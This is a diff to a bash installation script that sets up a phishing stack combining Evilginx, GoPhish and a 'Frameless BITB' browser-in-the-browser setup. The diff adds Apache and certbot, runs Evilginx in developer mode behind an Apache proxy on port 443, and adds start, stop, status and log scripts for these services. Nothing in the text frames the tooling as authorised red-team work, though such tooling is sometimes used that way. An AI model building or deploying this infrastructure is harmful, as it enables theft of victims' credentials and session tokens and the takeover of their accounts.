@@ -90,6 +90,9 @@ install_dependencies() {
         gcc
         g++
         build-essential
+        apache2
+        certbot
+        python3-certbot-apache
         screen
         net-tools
         ufw
@@ -633,18 +636,19 @@ create_management_scripts() {
     cat > /usr/local/bin/bitb-start <<'EOF'
 #!/bin/bash
 echo "Starting all services..."
+systemctl start apache2
 systemctl start gophish
 
 # Start Evilginx in screen if not running
 if ! screen -ls | grep -q "\.evilginx\s"; then
     echo "Starting Evilginx in screen..."
-    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
+    screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx -developer"
 else
     echo "Evilginx screen session already running"
 fi
 
 echo "All services started"
-systemctl status gophish --no-pager
+systemctl status apache2 gophish --no-pager
 echo ""
 echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
@@ -654,6 +658,7 @@ EOF
     cat > /usr/local/bin/bitb-stop <<'EOF'
 #!/bin/bash
 echo "Stopping all services..."
+systemctl stop apache2
 systemctl stop gophish
 
 # Kill Evilginx screen session
@@ -670,6 +675,7 @@ EOF
     cat > /usr/local/bin/bitb-restart <<'EOF'
 #!/bin/bash
 echo "Restarting all services..."
+systemctl restart apache2
 systemctl restart gophish
 
 # Restart Evilginx screen session
@@ -678,10 +684,10 @@ if screen -ls | grep -q "\.evilginx\s"; then
     screen -S evilginx -X quit
     sleep 2
 fi
-screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx"
+screen -dmS evilginx bash -c "cd /opt/evilginx && ./evilginx -p /opt/evilginx/phishlets -c /root/.evilginx -developer"
 
 echo "All services restarted"
-systemctl status gophish --no-pager
+systemctl status apache2 gophish --no-pager
 echo ""
 echo "Evilginx status: $(screen -ls | grep -q '\.evilginx\s' && echo 'Running in screen' || echo 'Not running')"
 EOF
@@ -691,6 +697,9 @@ EOF
     cat > /usr/local/bin/bitb-status <<'EOF'
 #!/bin/bash
 echo "Service Status:"
+echo ""
+echo "=== Apache2 ==="
+systemctl status apache2 --no-pager | head -n 3
 echo ""
 echo "=== GoPhish ==="
 systemctl status gophish --no-pager | head -n 3
@@ -713,6 +722,10 @@ EOF
 SERVICE="${1:-all}"
 
 case $SERVICE in
+    apache|apache2)
+        echo "=== Apache Logs ==="
+        tail -n 100 /var/log/apache2/error.log
+        ;;
     evilginx)
         echo "=== Evilginx Screen Session ==="
         echo "Evilginx runs in screen. To view live:"
@@ -726,6 +739,9 @@ case $SERVICE in
         journalctl -u gophish -n 100 --no-pager
         ;;
     *)
+        echo "=== Apache Logs ==="
+        tail -n 50 /var/log/apache2/error.log
+        echo ""
         echo "=== Evilginx ==="
         echo "Screen session: $(sudo screen -ls | grep -q '\.evilginx\s' && echo 'Running' || echo 'Not running')"
         echo "To access: sudo screen -r evilginx"
@@ -742,16 +758,21 @@ EOF
 
 # Start services
 start_services() {
-    section "STEP 14: Starting GoPhish Service"
+    section "STEP 14: Starting All Services"
 
-    info "Enabling GoPhish to start on boot..."
+    info "Enabling services to start on boot..."
+    systemctl enable apache2 || true
     systemctl enable gophish || true
+
+    info "Starting Apache..."
+    systemctl start apache2 || warning "Failed to start Apache"
+    sleep 2
 
     info "Starting GoPhish..."
     systemctl start gophish || warning "Failed to start GoPhish"
     sleep 2
 
-    log "GoPhish started successfully"
+    log "Apache and GoPhish started successfully"
     info "Evilginx will be started and configured in the next step..."
 }
 
@@ -765,8 +786,8 @@ start_and_configure_evilginx() {
     screen -S evilginx -X quit 2>/dev/null || true
     sleep 1
 
-    # Start Evilginx in detached screen session
-    screen -dmS evilginx bash -c "cd ${EVILGINX_DIR} && ./evilginx -p ${EVILGINX_DIR}/phishlets -c /root/.evilginx"
+    # Start Evilginx in detached screen session with -developer flag (runs on port 8443, Apache proxies from 443)
+    screen -dmS evilginx bash -c "cd ${EVILGINX_DIR} && ./evilginx -p ${EVILGINX_DIR}/phishlets -c /root/.evilginx -developer"
 
     info "Waiting for Evilginx to initialize..."
     sleep 8
@@ -869,7 +890,7 @@ show_summary() {
 # Main installation flow
 main() {
     echo "========================================="
-    echo "Evilginx + GoPhish - Automated Installation"
+    echo "Frameless BITB - Automated Installation"
     echo "Domain: ${DOMAIN}"
     echo "========================================="
     echo ""
@@ -881,11 +902,10 @@ main() {
     install_evilginx
     install_gophish
     configure_evilginx
-    # Apache removed - Evilginx handles port 443 directly
-    # configure_apache
-    # setup_ssl
-    # setup_frameless_bitb
-    # create_apache_config
+    configure_apache
+    setup_ssl
+    setup_frameless_bitb
+    create_apache_config
     configure_firewall
     create_services
     create_management_scripts
